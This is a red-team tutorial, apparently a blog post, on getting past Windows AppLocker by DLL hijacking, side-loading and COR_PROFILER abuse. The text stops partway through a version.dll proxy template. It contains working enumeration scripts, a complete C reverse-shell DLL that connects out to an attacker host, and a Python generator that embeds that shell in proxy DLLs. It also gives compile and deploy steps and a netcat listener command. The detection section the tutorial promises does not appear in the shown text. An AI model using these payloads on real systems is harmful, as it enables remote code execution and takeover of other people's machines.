---
title: "AppLocker Bypass — DLL Hijacking and Side-Loading"
date: 2026-03-06
description: "DLL search order hijacking, DLL side-loading, and COR_PROFILER abuse to execute code inside AppLocker-trusted processes — with Process Monitor methodology, C payload code, and blue team detection."
tags: ["applocker", "bypass", "dll-hijacking", "side-loading", "cor-profiler", "evasion", "windows", "blueteam"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1574.001](https://attack.mitre.org/techniques/T1574/001/) (DLL Search Order Hijacking), [T1574.002](https://attack.mitre.org/techniques/T1574/002/) (DLL Side-Loading), and [T1574.012](https://attack.mitre.org/techniques/T1574/012/) (COR_PROFILER).

---

## Lab Setup

Every technique here should be tested in a clean snapshot before touching a real engagement target.

### VM Stack

``` {linenos=inline}
┌─────────────────────────────────────────────────────────┐
│                   Host Machine                          │
│  ┌──────────────────────┐   ┌────────────────────────┐  │
│  │  Windows 10/11 VM    │   │   Kali Linux VM        │  │
│  │  (Target)            │   │   (Attacker)           │  │
│  │                      │   │                        │  │
│  │  - AppLocker enabled │   │  - Python HTTP server  │  │
│  │  - Standard user     │   │  - mingw-w64 (gcc)     │  │
│  │  - Sysmon installed  │   │  - pip install pefile  │  │
│  │  - Process Monitor   │   │  - nc / rlwrap         │  │
│  │  - mingw or VS Build │   │                        │  │
│  │                      │   │  192.168.56.101        │  │
│  │  192.168.56.100      │   └────────────────────────┘  │
│  └──────────────────────┘                               │
│              Host-only network: 192.168.56.0/24         │
└─────────────────────────────────────────────────────────┘
```

### Windows VM — AppLocker + DLL Tracing Configuration

```powershell {linenos=inline}
# 1. Enable AppLocker (standard setup)
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service -Name AppIDSvc

# 2. Apply default Executable rules and enforce
# gpedit.msc → AppLocker → Executable Rules → Create Default Rules
# Properties → Enforcement: Enforced

# 3. Note: DLL Rules are OFF by default — leave them off for most tests
# (DLL hijack works regardless; enable only to test that specific layer)

# 4. Create standard test user
$pw = ConvertTo-SecureString "Password1!" -AsPlainText -Force
New-LocalUser -Name "testuser" -Password $pw
Add-LocalGroupMember -Group "Users" -Member "testuser"

# 5. Install mingw-w64 for compiling hijack DLLs on Windows
# Download: https://www.mingw-w64.org/
# Or use Visual Studio Build Tools (cl.exe)
# Verify:
gcc --version   # should work after adding to PATH

# 6. Install Process Monitor (Sysinternals)
# Configure a DLL load filter:
#   Filter → Process Name → contains → notepad.exe (or your target)
#   Filter → Path → ends with → .dll
#   Filter → Operation → is → Load Image
# This shows exactly which DLLs load, in what order, from where

# 7. Find phantom DLLs (DLLs a process tries to load but doesn't find)
#   In Process Monitor: look for "NAME NOT FOUND" results with .dll paths
#   Those are your hijack targets

# 8. Enable process creation + image load audit
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
wevtutil sl Microsoft-Windows-AppLocker/EXE^and^DLL /e:true

# 9. Install pefile on Kali for the proxy DLL generator
pip3 install pefile
```

### Sysmon Configuration

```powershell
# Install Sysmon with image-load tracking enabled
# SwiftOnSecurity config enables Event ID 7 (Image Loaded) by default
C:\Tools\Sysmon64.exe -accepteula -i C:\Tools\sysmon-config.xml

# Watch DLL loads live
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 7 } |
    Select-Object TimeCreated, Message |
    Format-List
```

### Attacker VM (Kali) — DLL Compilation + Delivery

```bash {linenos=inline}
# Cross-compile a hijack DLL for Windows
x86_64-w64-mingw32-gcc -shared -o evil.dll hijack_base.c -lws2_32

# Verify exports
objdump -p evil.dll | grep -A20 "Export"

# Generate a proxy DLL (requires pefile)
pip3 install pefile
python3 dll_proxy_gen.py C:/Windows/System32/version.dll version_proxy.c

# Catch reverse shell
rlwrap nc -lvnp 4444

# Serve DLL over HTTP
python3 -m http.server 8080
```

### COR_PROFILER Test Setup

```powershell {linenos=inline}
# On Windows VM — verify .NET runtime is present
[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
# Should return something like C:\Windows\Microsoft.NET\Framework64\v4.0.30319\

# Compile the profiler DLL (from Visual Studio dev shell or on Kali with mingw)
# x86_64-w64-mingw32-gcc -shared -o profiler.dll profiler.c

# Set env vars (as standard user — these are user-scope)
$env:COR_ENABLE_PROFILING = "1"
$env:COR_PROFILER = "{DEADBEEF-DEAD-BEEF-DEAD-BEEFDEADBEEF}"
$env:COR_PROFILER_PATH = "C:\Users\testuser\AppData\Local\Temp\profiler.dll"

# Launch any .NET app — profiler DLL loads automatically
powershell -Command "Write-Host test"
```

### Snapshot

```
Take a snapshot named "AppLocker-DLL-Clean" after configuration.
Roll back between techniques to keep a known-good baseline.
```

---

## Diagrams

### Windows DLL Search Order (Visual)

``` {linenos=inline}
Process calls LoadLibrary("target.dll")
        │
        ▼
┌─── Already loaded in memory? ──────────────── YES → use cached copy
│
├─── KnownDLLs registry entry? ──────────────── YES → load from system section
│         (immune to hijacking)                         (skip filesystem)
│
├─── Application directory ◄── HIJACK ZONE 1 ── check binary's own folder
│         (highest priority on filesystem)
│
├─── C:\Windows\System32\
├─── C:\Windows\System\
├─── C:\Windows\           ◄── HIJACK ZONE 2 ── phantom DLL here if not in KnownDLLs
│
├─── Current working directory ◄── HIJACK ZONE 3 (if SafeDllSearchMode off)
│
└─── Directories in %PATH%  ◄── HIJACK ZONE 4 ── writable PATH entry wins

Rule: first match wins. Attacker wins by placing DLL earlier in the list.
```

### Phantom vs Side-Load vs Proxy — Comparison

``` {linenos=inline}
┌─────────────────┬──────────────────────────────┬──────────────────────────────┐
│   Technique     │  How It Works                │  When to Use                 │
├─────────────────┼──────────────────────────────┼──────────────────────────────┤
│ Phantom DLL     │ Target app imports a DLL that │ App has missing/optional     │
│                 │ doesn't exist on disk.         │ imports — Process Monitor    │
│                 │ Drop your DLL where Windows    │ shows NAME NOT FOUND         │
│                 │ would look first.              │                              │
├─────────────────┼──────────────────────────────┼──────────────────────────────┤
│ Side-Loading    │ Legitimate app bundles its     │ App ships in user-writable   │
│ (App dir)       │ own copy of a DLL. Replace     │ directory; replace the       │
│                 │ that copy with your version.   │ bundled DLL file.            │
├─────────────────┼──────────────────────────────┼──────────────────────────────┤
│ Proxy DLL       │ Your DLL forwards all real     │ App needs DLL to work        │
│                 │ exports to the legitimate DLL  │ correctly while payload      │
│                 │ while also running payload.    │ runs in background.          │
└─────────────────┴──────────────────────────────┴──────────────────────────────┘

Proxy DLL anatomy:
  your_evil.dll
      │
      ├── DllMain() → spawn payload thread → connect back
      └── All exported functions → forward to real_target.dll (legit)
              │
              └── App thinks it's talking to the real DLL ✓
```

### COR_PROFILER Execution Flow

``` {linenos=inline}
Standard user sets three environment variables (user scope, no admin needed):
  COR_ENABLE_PROFILING = 1
  COR_PROFILER         = {arbitrary CLSID}
  COR_PROFILER_PATH    = C:\...\evil_profiler.dll

        │
        ▼
Any .NET application launched by this user
  → .NET CLR reads env vars at startup
  → Sees COR_ENABLE_PROFILING=1
  → Loads COR_PROFILER_PATH DLL before managed code starts
        │
        ▼
DllMain() in evil_profiler.dll runs
  → Spawn reverse shell thread
  → Return valid ICorProfilerCallback interface (optional, avoids crash)
        │
        ▼
AppLocker sees: powershell.exe (trusted) loaded a DLL
  → DLL Rules disabled (default) → not evaluated
  → DLL path may be in user's AppData → no trusted path match
  → Payload runs anyway — AppLocker had no hook to stop it

Affected binaries: any .NET app (powershell.exe, msbuild.exe, etc.)
```

---

## Why DLL Hijacking Bypasses AppLocker

AppLocker has five rule categories. DLL Rules, the only one that covers `.dll` files, are **disabled by default**. Microsoft's own documentation notes they're off because the performance cost of evaluating every DLL load is prohibitive.

Even when DLL Rules are enabled, the bypass is still alive:

- The **hijacked process** is a legitimate, whitelisted binary. AppLocker allowed it.
- The **malicious DLL** executes inside that process's address space, not as a separate process AppLocker can evaluate.
- If the DLL sits in a **trusted path** (AppLocker path rule), DLL Rules pass it anyway.

The execution model is clean: you never launch your payload directly. A trusted binary launches, loads your DLL as part of its normal startup, and your code runs inside it. AppLocker sees only trusted processes.

---

## How Windows Finds DLLs

When a process calls `LoadLibrary("target.dll")` without a full path, Windows walks a search order:

```
1.  DLLs already loaded into the process (in-memory cache)
2.  Known DLLs  (HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs)
3.  Application directory  ← the binary's own folder
4.  C:\Windows\System32\
5.  C:\Windows\System\
6.  C:\Windows\
7.  Current working directory  (SafeDllSearchMode moves this late)
8.  Directories in %PATH%
```

**KnownDLLs** are the only truly protected entries. They load directly from a system-maintained section object, skipping the filesystem entirely. Everything else is fair game.

The three hijack surfaces:

| surface | what it means |
|---------|--------------|
| Application directory | Drop your DLL next to the binary — wins before System32 |
| Phantom DLL | App tries to load a DLL that doesn't exist — you provide it |
| PATH directory | Write to any writable directory earlier in PATH than System32 |

---

## Phase 1 — Enumeration

### Tool 1 — Find-PhantomDLLs.ps1

Phantom DLLs are the cleanest hijack targets: applications that try to load a DLL that doesn't exist on the system. No need to replace a real DLL, no forwarding required. Just show up.

```powershell {linenos=inline}
# Find-PhantomDLLs.ps1
# Monitors running processes for failed DLL loads using ETW / Sysmon data,
# and cross-references against a curated list of known phantoms.
# Falls back to static known-phantom list when live monitoring isn't available.

param(
    [switch]$LiveMonitor,          # requires Sysmon EID 7 access
    [int]   $MonitorSeconds = 30,
    [switch]$ShowAll
)

# ── curated phantom DLL list (confirmed missing on clean Windows installs) ──
$PhantomDLLs = @(
    [PSCustomObject]@{ DLL="wlbsctrl.dll";       Service="IKEEXT";      Risk="High";   Notes="Loads on network activity, SYSTEM context" },
    [PSCustomObject]@{ DLL="TSMSISrv.dll";        Service="SessionEnv";  Risk="High";   Notes="Terminal Services, loads on RDP connect" },
    [PSCustomObject]@{ DLL="TSVIPSrv.dll";        Service="SessionEnv";  Risk="High";   Notes="Same service as above" },
    [PSCustomObject]@{ DLL="oci.dll";             Service="MSDTC";       Risk="High";   Notes="Distributed Transaction Coordinator" },
    [PSCustomObject]@{ DLL="ntwdblib.dll";        Service="Various";     Risk="Medium"; Notes="Loaded by several SQL/app binaries" },
    [PSCustomObject]@{ DLL="symsrv.dll";          Process="DbgHelp apps";Risk="Medium"; Notes="Debug tools, less reliable trigger" },
    [PSCustomObject]@{ DLL="phoneinfo.dll";       Service="Various";     Risk="Medium"; Notes="Telephony stack on workstations" },
    [PSCustomObject]@{ DLL="WindowsCodecsRaw.dll";Process="Photo apps";  Risk="Low";    Notes="Photo viewer / codec stack" },
    [PSCustomObject]@{ DLL="Riched20.dll";        Process="WordPad";     Risk="Low";    Notes="User must open WordPad" },
    [PSCustomObject]@{ DLL="MSVBVM60.dll";        Process="VB6 apps";    Risk="Low";    Notes="Only present with VB6 runtimes installed" }
)

# ── check which phantoms are actually absent on this system ────────────────
function Test-DLLPresent([string]$dll) {
    $paths = @(
        [System.Environment]::SystemDirectory,
        [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory(),
        "$env:WINDIR\System",
        "$env:WINDIR"
    )
    foreach ($p in $paths) {
        if (Test-Path (Join-Path $p $dll)) { return $true }
    }
    return $false
}

$confirmed = $PhantomDLLs | Where-Object { -not (Test-DLLPresent $_.DLL) }

Write-Host "`n[+] Phantom DLLs confirmed absent on this system:" -ForegroundColor Green
$confirmed | Format-Table -AutoSize | Out-Host

# ── live ETW monitoring for missed DLL loads (requires admin + Sysmon) ──────
if ($LiveMonitor) {
    Write-Host "[*] monitoring Sysmon EID 7 for $MonitorSeconds seconds..." -ForegroundColor Cyan

    $startTime  = Get-Date
    $misses     = @{}

    Get-WinEvent -FilterHashtable @{
        LogName   = "Microsoft-Windows-Sysmon/Operational"
        Id        = 7        # ImageLoad — but we want NOT-loaded
        StartTime = $startTime
    } -ErrorAction SilentlyContinue | ForEach-Object {
        # EID 7 logs successful loads — parse for Signed=false + unexpected path
        $msg = $_.Message
        if ($msg -match "Signed: false" -and $msg -match "ImageLoaded: (.+\.dll)") {
            $dll  = Split-Path $matches[1] -Leaf
            $proc = if ($msg -match "Image: (.+)") { Split-Path $matches[1] -Leaf } else { "unknown" }
            if (-not $misses[$dll]) { $misses[$dll] = [System.Collections.Generic.List[string]]::new() }
            $misses[$dll].Add($proc)
        }
    }

    if ($misses.Count -gt 0) {
        Write-Host "`n[+] Unsigned DLL loads detected:" -ForegroundColor Yellow
        $misses.GetEnumerator() | ForEach-Object {
            Write-Host "    $($_.Key) ← $($_.Value -join ', ')"
        }
    }
}

# ── find writable directories that appear before System32 in PATH ───────────
Write-Host "`n[*] Checking PATH for writable pre-System32 directories..." -ForegroundColor Cyan
$sys32 = $env:SystemRoot + "\System32"
$pathDirs = $env:PATH -split ";"
$sys32Index = ($pathDirs | ForEach-Object { $_ } | Select-String -SimpleMatch $sys32 |
               Select-Object -First 1).LineNumber - 1

$pathDirs[0..$sys32Index] | ForEach-Object {
    $dir = $_.Trim()
    if (-not $dir -or -not (Test-Path $dir)) { return }
    $probe = Join-Path $dir "probe_$(Get-Random).dll"
    try {
        [IO.File]::WriteAllBytes($probe, @(0x4D,0x5A))
        Remove-Item $probe -Force
        Write-Host "  [WRITABLE] $dir" -ForegroundColor Yellow
    } catch {
        Write-Host "  [locked]   $dir" -ForegroundColor DarkGray
    }
}

$confirmed | Export-Csv ".\phantom_dlls.csv" -NoTypeInformation
Write-Host "`n[*] saved → phantom_dlls.csv"
```

---

### Tool 2 — Find-HijackableApps.ps1

Scans trusted paths for application directories where the current user can write, making them viable side-loading targets.

```powershell {linenos=inline}
# Find-HijackableApps.ps1
# Finds executables in AppLocker-trusted paths whose application
# directory is writable — prime side-loading real estate.

param(
    [string[]]$ScanRoots = @($env:PROGRAMFILES, ${env:PROGRAMFILES(X86)}, $env:WINDIR),
    [int]$MaxDepth = 3,
    [switch]$CheckImports   # parse PE imports to list hijackable DLL names
)

Add-Type -AssemblyName System.Reflection

function Test-DirWritable([string]$dir) {
    $probe = Join-Path $dir ([IO.Path]::GetRandomFileName())
    try {
        [IO.File]::WriteAllBytes($probe, @(0x4D,0x5A))
        Remove-Item $probe -Force
        return $true
    } catch { return $false }
}

function Get-PEImports([string]$exePath) {
    # Read PE import table — returns list of DLL names the binary imports
    try {
        $bytes  = [IO.File]::ReadAllBytes($exePath)
        $stream = New-Object IO.MemoryStream(,$bytes)
        $reader = New-Object IO.BinaryReader($stream)

        # MZ header
        $stream.Position = 0x3C
        $peOffset = $reader.ReadInt32()

        # PE signature
        $stream.Position = $peOffset
        $sig = $reader.ReadUInt32()
        if ($sig -ne 0x00004550) { return @() }

        # optional header magic
        $stream.Position = $peOffset + 24
        $magic = $reader.ReadUInt16()
        $is64  = ($magic -eq 0x20B)

        # data directory offset
        $ddOffset = if ($is64) { $peOffset + 24 + 112 } else { $peOffset + 24 + 96 }
        $stream.Position = $ddOffset
        $importRVA  = $reader.ReadUInt32()
        $importSize = $reader.ReadUInt32()
        if ($importRVA -eq 0) { return @() }

        # section headers — find section containing import RVA
        $numSections = & {
            $stream.Position = $peOffset + 6
            $reader.ReadUInt16()
        }
        $sectionOffset = $peOffset + 24 + (if ($is64) { 240 } else { 224 })
        $section = $null
        for ($i = 0; $i -lt $numSections; $i++) {
            $stream.Position = $sectionOffset + ($i * 40)
            $name    = $reader.ReadBytes(8)
            $vSize   = $reader.ReadUInt32()
            $vAddr   = $reader.ReadUInt32()
            $rawSize = $reader.ReadUInt32()
            $rawPtr  = $reader.ReadUInt32()
            if ($importRVA -ge $vAddr -and $importRVA -lt ($vAddr + $vSize)) {
                $section = @{ VAddr=$vAddr; RawPtr=$rawPtr }
                break
            }
        }
        if (-not $section) { return @() }

        # parse import descriptors
        $dlls = @()
        $pos  = $section.RawPtr + ($importRVA - $section.VAddr)
        while ($true) {
            $stream.Position = $pos
            $reader.ReadUInt32() | Out-Null  # OrigFirstThunk
            $reader.ReadUInt32() | Out-Null  # TimeDateStamp
            $reader.ReadUInt32() | Out-Null  # ForwarderChain
            $nameRVA   = $reader.ReadUInt32()
            $reader.ReadUInt32() | Out-Null  # FirstThunk
            if ($nameRVA -eq 0) { break }

            $nameOff  = $section.RawPtr + ($nameRVA - $section.VAddr)
            $stream.Position = $nameOff
            $nameBytes = @()
            $b = $reader.ReadByte()
            while ($b -ne 0) { $nameBytes += $b; $b = $reader.ReadByte() }
            $dlls += [Text.Encoding]::ASCII.GetString($nameBytes)
            $pos  += 20
        }
        return $dlls
    } catch { return @() }
}

$results = [System.Collections.Generic.List[PSCustomObject]]::new()

foreach ($root in $ScanRoots | Where-Object { $_ -and (Test-Path $_) }) {
    Write-Host "[*] scanning $root" -ForegroundColor Cyan

    Get-ChildItem -Path $root -Recurse -Filter "*.exe" -Depth $MaxDepth `
                  -ErrorAction SilentlyContinue |
    ForEach-Object {
        $exeDir = $_.DirectoryName
        if (Test-DirWritable $exeDir) {
            $imports = if ($CheckImports) { Get-PEImports $_.FullName } else { @() }
            $results.Add([PSCustomObject]@{
                Executable = $_.FullName
                Directory  = $exeDir
                Imports    = $imports -join "; "
                Signed     = (Get-AuthenticodeSignature $_.FullName).Status -eq "Valid"
            })
        }
    }
}

Write-Host "`n[+] Hijackable app directories ($($results.Count)):`n" -ForegroundColor Green
$results | Sort-Object Signed -Descending |
    Format-Table Executable, Signed, Directory -AutoSize | Out-Host

if ($CheckImports) {
    Write-Host "`n[+] Import detail (DLL names to hijack):" -ForegroundColor Yellow
    $results | Where-Object { $_.Imports } |
        Select-Object Executable, Imports |
        Format-List | Out-Host
}

$results | Export-Csv ".\hijackable_apps.csv" -NoTypeInformation
Write-Host "[*] saved → hijackable_apps.csv"
```

```powershell
# run
.\Find-HijackableApps.ps1
.\Find-HijackableApps.ps1 -CheckImports       # also parse PE imports
.\Find-HijackableApps.ps1 -ScanRoots @("C:\Windows") -MaxDepth 2
```

---

## Phase 2 — Payload: The Hijack DLL

### Base hijack DLL (no forwarding)

Use this when targeting a **phantom DLL**: the real DLL doesn't exist, so no forwarding needed.

```c {linenos=inline}
/* hijack_base.c
 * Phantom DLL hijack — drop where the target app expects a DLL that doesn't exist.
 * No export forwarding required.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -shared -o target.dll hijack_base.c \
 *       -lws2_32 -mwindows -s \
 *       -fno-ident -Wl,--build-id=none \
 *       -Wl,--enable-stdcall-fixup
 *
 * 32-bit (for 32-bit host processes):
 *   i686-w64-mingw32-gcc -shared -o target.dll hijack_base.c \
 *       -lws2_32 -mwindows -s -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define LHOST "10.10.10.10"
#define LPORT  4444

/* ── reverse shell ──────────────────────────────────────────────────────── */
static DWORD WINAPI shell_thread(LPVOID p) {
    (void)p;
    Sleep(500);   /* brief pause — lets the host process finish initializing */

    WSADATA wsa = {0};
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;

    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                             NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sock == INVALID_SOCKET) { WSACleanup(); return 1; }

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    /* retry connect — service DLLs load before network is fully up */
    int retries = 5;
    while (retries-- > 0) {
        if (connect(sock, (SOCKADDR*)&sa, sizeof(sa)) == 0) break;
        Sleep(2000);
    }
    if (retries < 0) { closesocket(sock); WSACleanup(); return 1; }

    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (HANDLE)sock;
    si.hStdOutput  = (HANDLE)sock;
    si.hStdError   = (HANDLE)sock;

    PROCESS_INFORMATION pi = {0};
    char cmd[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}

/* ── DllMain ─────────────────────────────────────────────────────────────── */
BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hMod);
            CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

---

## Phase 3 — DLL Proxying

Proxying is the professional tier of DLL hijacking. Your malicious DLL sits in place of the real one, runs your payload, and **forwards every exported function call to the legitimate DLL**. The host process works perfectly: stability is maintained, the target doesn't crash, and the blue team doesn't get an obvious signal.

The mechanism is a linker pragma:

```c
#pragma comment(linker, "/export:FunctionName=realDLL.FunctionName,@ordinal")
```

This tells the linker to add an export that forwards directly to the real DLL at load time. Zero overhead, zero code needed for each forwarded function.

---

### Tool 3 — DLL Proxy Generator (Python)

Automatically extracts all exports from a real DLL and generates a ready-to-compile C proxy file.

```python {linenos=inline}
#!/usr/bin/env python3
# dll_proxy_gen.py
# Reads exports from a real DLL and generates a C proxy with:
#   - #pragma forwarding for every export
#   - DllMain with reverse shell payload
#   - Compile instructions
#
# Requires: pip install pefile
#
# Usage:
#   python3 dll_proxy_gen.py -i C:\Windows\System32\version.dll -o version_proxy.c
#   python3 dll_proxy_gen.py -i target.dll -o proxy.c --lhost 10.10.10.10 --lport 4444

import argparse
import os
import sys

try:
    import pefile
except ImportError:
    sys.exit("[-] pefile not installed — run: pip install pefile")


TEMPLATE = r"""/*
 * {dll_name} — DLL proxy
 * Auto-generated by dll_proxy_gen.py
 *
 * Real DLL forwarded to: {real_dll_path}
 * Exports forwarded:     {export_count}
 *
 * Compile (x64):
 *   x86_64-w64-mingw32-gcc -shared -o {dll_name} {src_name} \
 *       -lws2_32 -mwindows -s -fno-ident -Wl,--build-id=none
 *
 * Compile (x86):
 *   i686-w64-mingw32-gcc -shared -o {dll_name} {src_name} \
 *       -lws2_32 -mwindows -s -Wl,--build-id=none
 *
 * Deploy:
 *   1. Place real {dll_name} alongside this proxy as "{real_basename}"
 *      OR set forward path to absolute System32 path (see --absolute flag)
 *   2. Drop this proxy where the target app will find it first
 */

#pragma comment(linker, "/subsystem:windows")

/* ── export forwards ─────────────────────────────────────────────────────── */
/* Each line redirects a call to our proxy → the real DLL transparently      */
{forwards}

/* ── payload ─────────────────────────────────────────────────────────────── */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define LHOST "{lhost}"
#define LPORT  {lport}

static DWORD WINAPI shell_thread(LPVOID p) {{
    (void)p;
    Sleep(800);

    WSADATA wsa = {{0}};
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;

    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                             NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sock == INVALID_SOCKET) {{ WSACleanup(); return 1; }}

    struct sockaddr_in sa = {{0}};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    int retries = 5;
    while (retries-- > 0) {{
        if (connect(sock, (SOCKADDR*)&sa, sizeof(sa)) == 0) break;
        Sleep(2000);
    }}
    if (retries < 0) {{ closesocket(sock); WSACleanup(); return 1; }}

    STARTUPINFOA si      = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (HANDLE)sock;
    si.hStdOutput  = (HANDLE)sock;
    si.hStdError   = (HANDLE)sock;

    char cmd[] = "cmd.exe";
    CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        DisableThreadLibraryCalls(hMod);
        CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
    }}
    return TRUE;
}}
"""


def get_exports(dll_path: str):
    pe = pefile.PE(dll_path, fast_load=False)
    pe.parse_data_directories(
        directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
    )

    exports = []
    if not hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
        return exports

    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        name    = exp.name.decode() if exp.name else None
        ordinal = exp.ordinal
        exports.append((name, ordinal))

    return exports


def build_forwards(exports: list, forward_target: str) -> str:
    """
    Build #pragma comment(linker, "/export:...") lines.
    forward_target: the DLL name to forward to (without .dll, or full path stem)
    """
    lines = []
    for name, ordinal in exports:
        if name:
            # named export forward
            line = (
                f'#pragma comment(linker, "/export:{name}='
                f'{forward_target}.{name},@{ordinal}")'
            )
        else:
            # ordinal-only export — forward by ordinal
            line = (
                f'#pragma comment(linker, "/export:#{ordinal}='
                f'{forward_target}.#{ordinal}")'
            )
        lines.append(line)
    return "\n".join(lines)


def main():
    p = argparse.ArgumentParser(description="DLL Proxy C file generator")
    p.add_argument("-i", "--input",    required=True, help="path to real DLL")
    p.add_argument("-o", "--output",   required=True, help="output .c file")
    p.add_argument("--lhost",          default="10.10.10.10")
    p.add_argument("--lport",          default=4444, type=int)
    p.add_argument("--real-name",      default=None,
                   help="name the real DLL will be saved as (default: orig_<name>)")
    p.add_argument("--absolute",       action="store_true",
                   help="forward to absolute System32 path instead of relative name")
    args = p.parse_args()

    dll_path    = os.path.abspath(args.input)
    dll_name    = os.path.basename(dll_path)
    dll_stem    = os.path.splitext(dll_name)[0]
    src_name    = os.path.basename(args.output)

    real_basename = args.real_name or f"orig_{dll_name}"
    real_stem     = os.path.splitext(real_basename)[0]

    if args.absolute:
        # forward to System32 absolute path — no need to carry the real DLL
        forward_target = f"C:\\\\Windows\\\\System32\\\\{dll_stem}"
    else:
        forward_target = real_stem

    print(f"[*] parsing exports from {dll_path}")
    exports = get_exports(dll_path)
    print(f"[+] found {len(exports)} exports")

    forwards = build_forwards(exports, forward_target)

    src = TEMPLATE.format(
        dll_name     = dll_name,
        real_dll_path= dll_path,
        real_basename= real_basename,
        src_name     = src_name,
        export_count = len(exports),
        forwards     = forwards,
        lhost        = args.lhost,
        lport        = args.lport,
    )

    with open(args.output, "w") as f:
        f.write(src)

    print(f"[+] written → {args.output}")
    print()
    print("── compile ─────────────────────────────────────────────────────")
    print(f"  x86_64-w64-mingw32-gcc -shared -o {dll_name} {src_name} \\")
    print(f"      -lws2_32 -mwindows -s -fno-ident -Wl,--build-id=none")
    print()
    if not args.absolute:
        print("── deploy ──────────────────────────────────────────────────────")
        print(f"  1. rename real {dll_name} → {real_basename}")
        print(f"  2. place both files in the target app directory")
        print(f"     proxy:   {dll_name}  (your compiled payload)")
        print(f"     real:    {real_basename}  (original, forwards go here)")
    else:
        print("── deploy (absolute mode) ───────────────────────────────────────")
        print(f"  Drop {dll_name} in the target app directory.")
        print(f"  Forwards go directly to System32 — no companion DLL needed.")


if __name__ == "__main__":
    main()
```

```bash {linenos=inline}
# generate proxy for version.dll (common side-load target)
python3 dll_proxy_gen.py \
    -i /mnt/win/Windows/System32/version.dll \
    -o version_proxy.c \
    --lhost 10.10.10.10 \
    --lport 4444

# absolute mode — no companion DLL needed on target
python3 dll_proxy_gen.py \
    -i /mnt/win/Windows/System32/version.dll \
    -o version_proxy.c \
    --absolute

# compile
x86_64-w64-mingw32-gcc -shared -o version.dll version_proxy.c \
    -lws2_32 -mwindows -s -fno-ident -Wl,--build-id=none
```

---

### Manual proxy template (no pefile needed)

When you already know the exports or are targeting a DLL with few of them:

```c {linenos=inline}
/* version_proxy.c — manual proxy for version.dll
 * version.dll exports exactly these 17 functions — all forwarded to System32
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -shared -o version.dll version_proxy.c \
 *       -lws2_32 -mwindows -s -fno-ident -Wl,--build-id=none
 */

/* forward all 17 version.dll exports to the real System32 copy */
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@9")
#pragma comment(linker, "/export:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA,@10")
